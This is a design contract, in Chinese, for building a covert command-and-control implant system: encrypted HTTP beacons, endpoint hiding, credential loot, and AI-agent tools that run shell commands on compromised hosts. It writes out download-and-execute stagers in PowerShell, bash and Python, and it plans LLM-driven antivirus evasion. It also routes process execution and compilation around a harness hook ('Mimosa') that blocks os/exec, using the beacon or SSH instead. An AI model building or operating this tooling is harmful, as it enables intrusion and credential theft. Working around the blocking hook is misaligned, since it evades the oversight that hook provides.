# C2_CONTRACTS.md — C2 中心契约（冻结版 v1，2026-09-26）

多 agent 并行开发的唯一规范。**本文件由主会话冻结；实现中若必须增改接口，只允许追加方法/字段并在提交说明里列出，禁止改名/改签名/删字段。**

## 0. 模块定位与范围

C2 = 后渗透（stage=post）的指挥控制：自研轻量 beacon（HTTP 回连）+ 监听器 + 会话管理 + AI agent 完整接入。

**本期（wave 1）范围**：监听器（http）、beacon（ps1/bash/py/gosrc 源码）、会话注册/心跳/休眠/终止、shell 命令、文件列表/上传/下载、战利品、载荷生成与投递、8 个 agent 工具、前端 6 页。

**二期（本期不做，但表结构/代码留口）**：https 监听器、隧道（socks5/转发）、免杀工作台（LLM 变形+静态自测）、Go 编译载荷（受 Mimosa 约束，见 §9）、loot→finding 联动、post 阶段内置 agent、同端口部署模式。

**硬约束（违反=Mimosa 拦截或架构破坏）**：
1. 新 Go 源码**禁止 import os/exec**（平台钩子全禁，连常量参数都拦）。一切进程执行走 beacon 自身或 SSH。
2. `c2center/` 包**禁止 import db/server**；一切持久化经 `Store` 接口（§4）回到 server 层。仿 `vpscenter/manager.go` 头注释纪律。
3. **运行时视图过 API 必须带 json tag**（snake_case），或过 DTO 转换（VPS 踩过裸序列化大写字段打崩前端）。
4. 所有返回集合的接口，Go 侧 nil slice 一律初始化为空 slice（Go nil→JSON null 打崩前端，踩过）。
5. 凭据/密钥列在 db 层只见 secretbox 密文；明文只在 server 层内存中出现，接口永不回显明文 key。
6. 测试连库必须显式 `ARTEX_PG_DSN='postgres://postgres@127.0.0.1:5499/postgres?sslmode=disable'`（5499 演示库，绝不连 5432）。
7. 中文测试数据一律 UTF-8 文件 + `--data-binary @file`（Git Bash curl 会 GBK 毁中文）。
8. Go 源码一律用 Write/Edit 工具写，不走 Bash heredoc（Mimosa 拦）。

## 1. 文件所有权矩阵

| 文件/目录 | 所有者 | 其他人 |
|---|---|---|
| `C2_CONTRACTS.md` | 主会话（冻结） | 只读 |
| `db/schema.sql`（C2 段） | 主会话（已改完） | 只读 |
| `web/src/lib/types.ts`（C2 段）、`web/src/lib/api.ts`（c2 段） | 主会话（已改完） | 只读 |
| `web/src/navigation/sidebar/sidebar-items.ts`（C2 分组） | 主会话（已改完） | 只读 |
| `c2center/**`（含 *_test.go） | Agent A | 只读 |
| `db/c2.go`、`server/c2_center.go`、`server/c2_api.go`、`server/c2_agent.go`、`server/server.go`（仅 §6 两处定点插入）、`server/orchestration.go`（仅 §7 一行 append）、`db/c2_test.go` | Agent B | 只读 |
| `web/src/app/(main)/function/c2/**`、`web/src/components/c2-*.tsx` | Agent C | 只读 |
| 集成期修编译错 | 主会话 | — |

**发现需要改非自有文件时：不许动手，写进提交说明/最终报告，由主会话处理。** 共享冻结文件（types.ts/api.ts/schema.sql/sidebar）任何 agent 不得编辑。

## 2. 数据模型（schema.sql 已落地，照此实现）

6 张表：`c2_listeners` / `c2_sessions` / `c2_tasks` / `c2_transfers` / `c2_loot` / `c2_payloads`。完整 DDL 见 `db/schema.sql` 尾部（主会话已追加）。要点：

- `c2_listeners.enc_key` 是 secretbox 密文（BYTEA），明文 32B key 只在 server 层解出后交给 c2center。
- `c2_sessions.sid` 全局唯一（beacon 令牌）；`listener_id+beacon_uid` 幂等复活；`status ∈ online|offline|dead`；`task_id` 可空=绑定任务。
- `c2_tasks.status ∈ queued|sent|done|error`；`actor ∈ user|agent`；`kind ∈ shell|files_list|upload|download|loot|info`。
- `c2_transfers.direction ∈ up|down`（up=平台→目标，down=目标→平台）；`status ∈ queued|running|done|error`。
- `c2_loot.kind ∈ credential|hash|file|screenshot|other`；credential/hash 类 `content` 存 secretbox 密文。
- `c2_payloads.token` 唯一（监听器投递令牌）；`format ∈ ps1|bash|py|gosrc`；`target ∈ windows|linux|macos|cross`。

## 3. Beacon 通信协议（冻结）

**传输**：监听器 = 独立端口的 HTTP server（仿 `proxycenter/pool.go` Pool 模式：Options 注入、New 不启动、Start 里 net.Listen+http.Server goroutine、Stop 用 sync.Once+Shutdown）。信道路径 `POST /<url_path>/e`，载荷投递 `GET /<url_path>/p/<token>`。Content-Type: `application/octet-stream`，body = `base64( AES-256-GCM( json ) )`，密文格式 `nonce(12B) || ciphertext`。

**信封**（JSON，字段名刻意短——省字节也是伪装）：

```
请求公共字段: { "t": 类型, "sid": 会话令牌(reg 时省略), "ts": unix秒, "nc": 随机UUID, "d": 载荷 }
  t=reg   d={uid,hn,us,el,os,ar,ip,pi,pr}   // uid=sha256(listenerID|hostname|username|os)前16hex
  t=poll  (d 省略)                           // 长轮询,server 最多挂 25s
  t=res   d={rs:[{id,st,o,e}]}              // st∈done|error, o=输出b64, e=错误文本; 可与 poll 合并:有结果带结果,顺便拉新任务
  t=file  d={a:"ls|pull|push", tf:transferID, p:"路径", of:偏移, ln:长度, b:b64数据, eof:bool}

响应公共字段: { "t": 类型, "meta": {"sl":sleep秒,"jt":抖动%,"kl":是否退出}, "d": 载荷 }   // meta 每个响应都带
  t=ack
  t=tasks d={ts:[{id,kind,input}]}
  t=file  d={对 ls: {es:[{n,s,d,m}]}  对 pull: {b,eof}  对 push: {}}
```

**安全**：ts 偏移 ±10min；nc 按 sid 存 LRU 去重（1024 条）防重放；body 上限 8MB（文件分片 256KB）；密钥错误一律 404（不暴露端点存在性）。

**beacon 行为规范**（四种格式一致实现）：
1. 启动发 reg → 拿 sid → 循环 poll/res；每次响应的 meta 覆盖本地 sleep/jitter；kl=true 则退出。
2. shell：Linux 走 `sh -c`，Windows 走 `powershell -NoProfile -Command`；stdout+stderr 合并，上限 1MB；非零退出码 status=error。
3. files_list：输出 `[{n,s,d,m}]` JSON（目录浏览）。
4. upload（input={transfer_id,remote_path}）：循环 file/pull 拉平台 blob 分片写远端；download：循环 file/push 推远端分片，先发 size。
5. 连续失败退避：sleep×2 封顶 10 倍；成功复位。
6. UA 固定 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`；不加重放之外的任何自定义头。
7. gosrc：单文件 main.go 源码工程（zip），内嵌相同逻辑，附 BUILD.md（`GOOS=windows go build` 一行说明）。**c2center 不得 import os/exec——不提供编译，只提供源码包**（编译走二期 VPS 方案）。

**载荷内容**：ps1/bash/py 模板内嵌监听器 callback URL + base64(key) + url_path。一行命令（oneliner）：
- ps1: `powershell -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('<callback>/<url_path>/p/<token>'))"`
- bash: `curl -fsSL <callback>/<url_path>/p/<token> | bash`
- py: `python3 -c "exec(__import__('urllib.request',fromlist=['x']).urlopen('<callback>/<url_path>/p/<token>').read())"`

监听器运行时才能投递载荷；`callback` 为空时生成载荷必须报错提示先填回调地址。

**补充约定（冻结）**：
- reg 的响应 `t=ack`，`d={sid:"会话令牌"}`（beacon 靠它拿到 sid）。
- 每个响应的 `meta` 由 server 从会话行派生：`sl`/`jt` 取 sleep_sec/jitter_pct，`kl = (status=="dead")`——终止会话=置 dead，beacon 下次心跳自行退出，无独立 kill 信令。
- blob 目录读写分工（都在 `<BaseDir>/c2/` 下）：`uploads/` server API 写（上传接口）、c2center 读（beacon pull 分片）；`outputs/` c2center 写（大输出落盘）、server API 读（下载接口）；`downloads/` c2center 写（down 产物）、server API 读；`payloads/` c2center 写（RenderPayload 返回字节，由 server 落盘）、server API 读。文件名一律带数字 id（`<transferID>.bin` 等），路径只由服务端构造。

## 4. c2center 包公共面（冻结，Agent A 实现）

包路径 `github.com/Autumn-27/artex/c2center`，server 内 import 用包名原样 `c2center`。

```go
// Store 是 Manager 需要的持久化能力(由 server 侧实现,桥到 db 包)。仿 vpscenter.Store。
type Store interface {
	// 监听器
	CreateListener(in ListenerInput) (int64, error)
	ListListeners() ([]Listener, error) // 含 SessionCount
	GetListener(id int64) (*Listener, error)
	UpdateListener(id int64, in ListenerInput) error
	DeleteListener(id int64) error
	SetListenerEnabled(id int64, enabled bool) error
	GetListenerKey(id int64) ([]byte, error) // 返回解封后的 32B key(server 适配器里做 secretbox open)
	// 会话
	UpsertSession(in SessionInput) (int64, error) // 按 listener_id+beacon_uid 幂等:存在则更新主机信息并置 online,不存在则建
	GetSessionBySID(sid string) (*Session, error)
	GetSession(id int64) (*Session, error)
	ListSessions(f SessionFilter) ([]Session, int, error)
	SetSessionSleep(sid string, sleepSec, jitterPct int) error
	SetSessionStatusBySID(sid string, status string) error
	BindSessionTask(id, taskID int64) error
	SweepOfflineSessions(graceMultiplier int) (int64, error) // last_seen 超 sleep*(1+grace) 的 online→offline
	// 任务
	CreateTask(in TaskInput) (int64, error)
	TakeQueuedTasks(sessionID int64, limit int) ([]Task, error) // queued→sent 原子批量,返回被取走的
	FinishTask(id int64, status, output, outPath string, outSize int64, errText string) error
	GetTask(id int64) (*Task, error)
	ListTasks(sessionID, afterID int64, limit int) ([]Task, error)
	CountQueuedTasks() (int, error)
	// 文件传输
	CreateTransfer(in TransferInput) (int64, error)
	UpdateTransfer(id int64, status string, doneSize int64, localPath, errText string) error
	ListTransfers(sessionID int64, limit int) ([]Transfer, error)
	GetTransfer(id int64) (*Transfer, error)
	// 战利品
	CreateLoot(in LootInput) (int64, error)
	ListLoot(f LootFilter) ([]Loot, int, error)
	GetLoot(id int64) (*Loot, error) // content 为密文,解密在 server 层
	DeleteLoot(id int64) error
	// 载荷
	CreatePayload(in PayloadInput) (int64, error)
	ListPayloads(listenerID int64) ([]Payload, error)
	GetPayload(id int64) (*Payload, error)
	GetPayloadByToken(token string) (*Payload, error)
	DeletePayload(id int64) error
}

type Manager struct{ /* BaseDir string; 持 store/log/listeners map/ctx */ }
func NewManager(st Store, log *slog.Logger) *Manager
func (m *Manager) Start(ctx context.Context)            // 拉起 enabled 监听器 + 30s 巡检 loop(sweep offline)
func (m *Manager) StartListener(l *Listener) error      // 启动单个监听器(端口被占返回明确错误)
func (m *Manager) StopListener(id int64) error
func (m *Manager) ListenerRunning(id int64) bool
```

结构体（c2center 内定义，**全部带 json tag snake_case**）：`Listener{ID,Name,Proto,BindHost,Port,URLPath,Callback,Enabled,SessionCount,Notes,CreatedAt,UpdatedAt}`、`Session{ID,ListenerID,BeaconUID,SID,Hostname,Username,Elevated,OS,Arch,LocalIPs,PID,Process,SleepSec,JitterPct,TaskID,Status,Labels,Meta(map[string]any),FirstSeen,LastSeen}`、`Task{ID,SessionID,Kind,Input,Output,OutputPath,OutputSize,Status,Actor,CreatedBy,Error,CreatedAt,SentAt,DoneAt}`、`Transfer{ID,SessionID,TaskID,Direction,RemotePath,Size,DoneSize,Status,Error,CreatedAt,DoneAt}`、`Loot{ID,SessionID,TaskID,Kind,Name,Content,BlobPath,SourcePath,FindingID,CreatedAt}`、`Payload{ID,ListenerID,Name,Format,Target,Token,SHA256,Size,Oneliner,CreatedBy,CreatedAt}`；对应 `XxxInput`、`SessionFilter{Status,ListenerID,TaskID,Q,CompanyID,Limit,Offset}`、`LootFilter{Kind,SessionID,Q,Limit,Offset}`。

时间字段统一 `time.Time`（可空用 *time.Time）。可空 int64 一律 0 表示无（COALESCE 惯例）。

单测要求（`go test ./c2center/` 必须全绿，不连库）：fake Store + httptest 起真监听器 → 用 Seal/Open 模拟 beacon 走 reg→下发 shell(假执行)→res→files_list/pull/push 全链路；ts/nc 防重放与密钥错误 404 用例必写。

## 5. server API 面（冻结，Agent B 实现）

注册函数 `func (s *Server) registerC2Routes(mux *http.ServeMux)`（仿 `server/vps_api.go`）；handler 用 `writeJSON/writeErr`；`{id}` 用 `r.PathValue`；分页 `atoiDefault`；集合字段 `nonNilPtrSlice`；body 用 `http.MaxBytesReader`（上传接口 16MB，其余 1MB）。

```
GET    /api/c2/overview                         汇总: 会话三态数/监听器数/排队任务数/最近10会话/最近10任务
GET    /api/c2/listeners                        {listeners:[...],total}
POST   /api/c2/listeners                        {name,bind_host,port,callback,url_path?,notes} → 201 {id}
GET    /api/c2/listeners/{id}
PUT    /api/c2/listeners/{id}                   (同 POST 字段;改 url_path/port 需先停)
DELETE /api/c2/listeners/{id}                   有会话→409
POST   /api/c2/listeners/{id}/start | /stop     启停运行时;返回 {addr} 实际监听地址
GET    /api/c2/sessions?status=&listener_id=&task_id=&company_id=&q=&limit=&offset=
GET    /api/c2/sessions/{id}
POST   /api/c2/sessions/{id}/kill               status→dead,meta 下发 kl
POST   /api/c2/sessions/{id}/sleep              {sleep_sec(1-3600),jitter_pct(0-90)}
POST   /api/c2/sessions/{id}/bind               {task_id} 0=解绑
GET    /api/c2/sessions/{id}/tasks?after_id=&limit=     增量拉取(前端 2s 轮询)
POST   /api/c2/sessions/{id}/tasks              {kind: shell|files_list|info, input} → {id}
GET    /api/c2/tasks/{id}/output                大输出落盘文件下载(output_path)
GET    /api/c2/sessions/{id}/transfers?limit=
POST   /api/c2/sessions/{id}/files/list         {path} → 建任务,返回 task_id(结果从 tasks 轮询)
POST   /api/c2/sessions/{id}/files/upload       multipart: file + path(远端目录) → 建 blob+transfer+upload 任务 → {transfer_id}
POST   /api/c2/sessions/{id}/files/download     {remote_path} → transfer+download 任务 → {transfer_id}
GET    /api/c2/transfers/{id}/download          平台取回下载产物(数字 id 定位,路径服务端构造,防穿越仿 report_export_api.go)
GET    /api/c2/loot?kind=&session_id=&q=&limit=&offset=   列表 content 恒空串,带 has_content
POST   /api/c2/loot                             {session_id,kind,name,content,source_path}
GET    /api/c2/loot/{id}                        content 解密明文(仅此一处)
DELETE /api/c2/loot/{id}
GET    /api/c2/payloads?listener_id=
POST   /api/c2/payloads                         {listener_id,format,target,name} → 201 {id,oneliner};callback 为空→400
DELETE /api/c2/payloads/{id}
GET    /api/c2/payloads/{id}/download           鉴权下载;文件名 Content-Disposition
```

server 侧职责：`c2Store` 适配器实现 c2center.Store（薄桥 db，含 secretbox 解封 GetListenerKey）；blob 目录 `<BaseDir>/c2/{uploads,outputs,payloads}/`；Manager 包级单例（带锁，仿 vpsMgr）。

## 6. 接线（server.go 仅两处定点插入，Agent B 操作）

1. `New()` 里 `initVPS()`（server.go:175 附近）之后加 `initC2()`。
2. `Handler()` 里 `s.registerVPSRoutes(mux)`（server.go:905-908 附近）之后加 `s.registerC2Routes(mux)`。

`initC2()`（在 c2_center.go，仿 initVPS）：`pg := s.m.PG()` → `store := newC2Store(s, pg)` → `mgr := c2center.NewManager(store, slog.Default())` → `mgr.BaseDir = s.m.dir` → set 单例 → `go mgr.Start(s.ctx)`（内部先拉 enabled 监听器）。任务终态不挂钩（C2 会话不随任务终态销毁，二期再议）。

## 7. Agent 工具（8 个，Agent B 实现）

文件 `server/c2_agent.go`，仿 `server/vps_agent.go`：`roTool/wrTool` + `objSchema/strParam` + `jsonResult` 造工具；`RunInfoFrom(ctx).TaskID` 取任务；`seedC2AgentTools()` 用 `SeedToolWithStage(name, desc, schema, ["worker"], "post")` 播种，在 New() 附近调用一次；`orchestration.go` 的 hostTools 里**仅追加一行** `tools = append(tools, s.c2AgentTools()...)`。

| 工具 | 入参 | 行为 |
|---|---|---|
| c2_session_list | {status?} | 列会话(id/status/hostname/user/os/task_id/last_seen) |
| c2_session_info | {session_id} | 主机档案+meta+任务计数 |
| c2_exec | {session_id, command, timeout_sec?(≤300,默认60)} | 建 shell 任务→轮询至终态→返回{status,output(截8KB)}。**stage 门禁：任务 stage≠post 拒绝执行**；下发前过拦截决策（见下） |
| c2_upload | {session_id, remote_path, content_b64} | ≤1MB，建 upload 任务并等完成 |
| c2_download | {session_id, remote_path} | 建 download 任务等完成，返回本地路径+大小+文本前 2KB 预览 |
| c2_loot_record | {session_id, kind, name, content} | 记战利品（credential 自动加密） |
| c2_loot_search | {q?, kind?} | 查战利品库 |
| c2_payload_create | {listener_id, format, target?, name?} | 生成载荷，返回 id+oneliner+投递 URL |

**c2_exec 拦截**：下发前用 `s.m.interceptor`（server/manager.go 已有）按 `guard.applyIntercept` 的模式对命令做 Match（deny→拒绝并返回管控文案；ask→写审批队列并返回「已提交人工审批」）。LLM Judge 若接线复杂可省（只走 Match 硬规则），在代码注释注明。

## 8. 前端（Agent C，严格按冻结的 types.ts/api.ts 写）

路由与页面（静态导出约束：`useSearchParams` 一律包 `React.Suspense`；列表页四件套=搜索+筛选+排序(当前页客户端排序)+`TablePagination`；`table-fixed` 且固定列合计 ≤700px、标题列不设宽度；表格内 ghost 按钮已有全局 CSS 不用管）：

1. `/function/c2` 总览：统计卡（在线/失联/终止、监听器启用数、排队任务）+ 最近上线会话表 + 最近任务表；10s 轮询（仿 vps/page.tsx）。
2. `/function/c2/listeners`：标准列表（名称/回调地址/在线会话数/状态/备注/操作）；新建/编辑 Dialog（name、bind_host 默认 0.0.0.0、port 空=自动、callback、url_path 自动生成可改、notes）；行操作：启停（显示实际 addr）、复制回调地址、编辑、删除；启停失败（端口占用）toast 报错原文。
3. `/function/c2/sessions`：标准列表（状态点：绿 online/灰 offline/红 dead；主机/用户/权限/系统/内网IP/归属任务/心跳/sleep）；筛选 status+listener；行操作：绑定任务（选任务 Dialog）、终止、详情。
4. `/function/c2/detail?id=`：头部主机卡（信息+sleep 调节+终止）+ Tabs（深链 ?tab=）：
   - 交互：输出日志区（monospace 滚动）+ 命令输入行 → POST tasks{kind:shell} → 2s 轮询 tasks?after_id= 增量追加（非真 PTY，页面注明「命令-响应式通道」）。
   - 文件：路径输入+浏览按钮（files_list 任务轮询结果渲染表格：名称/大小/目录/修改时间）+ 上传（FormData）+ 下载（transfer 轮询+完成后取 /api/c2/transfers/{id}/download）+ 传输列表。
   - 流水：该会话全部任务表（时间/操作者/类型/输入截断/状态/输出可展开）。
   - 档案：session 元信息 + 「刷新采集」按钮（info 任务）。
5. `/function/c2/payloads`：生成表单（监听器下拉/格式 ps1|bash|py|gosrc/目标/名称）+ 载荷列表（名称/格式/目标/SHA256 前 12/大小/创建时间/操作：下载、复制一行命令、复制投递 URL、删除）；页内「免杀工作台」占位面板（Badge「二期建设中」，不放可点控件——只读徽标≠筛选器的教训）。
6. `/function/c2/loot`：kind 页签（全部/凭据/哈希/文件/截图/其他，带计数，可点）+ 列表（名称/类型/来源路径/会话/时间/操作：查看(credential 走详情接口明文，弹窗显示)、删除）。

api.ts 调用只准用主会话冻结的 `c2*` 区段；发现缺接口→报告，不准自己加。

## 9. 二期占位（本期不实现，别写死阻碍）

- 免杀工作台 `/function/c2/evasion`：`c2_evasion_profiles`/`c2_jobs` 表、LLM 变形管线（仿 report_pipeline.go 异步 job+瞬态重试）、本地静态自测（特征串/熵）。**不接任何外部沙箱（载荷上传第三方=泄漏）**。
- 编译型载荷：经指派 VPS 的 SSH 执行 go build（vpscenter.ExecCommand 现成）——这是 os/exec 禁令下的编译路径。
- 隧道：socks5/转发多路复用在长轮询信道上，全模块最重，独立里程碑。
- loot→finding：走 exploration 节点创建；post 内置 agent（promptcatalog 补 post_worker）。

## 10. 验收标准（集成阶段主会话执行）

1. `go vet ./c2center/ ./db/ ./server/` 干净；`go test ./c2center/` 全绿。
2. `GOSUMDB="sum.golang.org" ./build-local.sh out/artex-local` 构建成功（先停 8787+8799 两实例）。
3. 8799 冒烟：建监听器→启停→生成 ps1/bash 载荷→本机跑 bash beacon→会话上线→shell 往返→files_list→loot 记录→overview 计数正确。
4. 前端 6 页可打开、四件套齐全、无 console 崩溃。
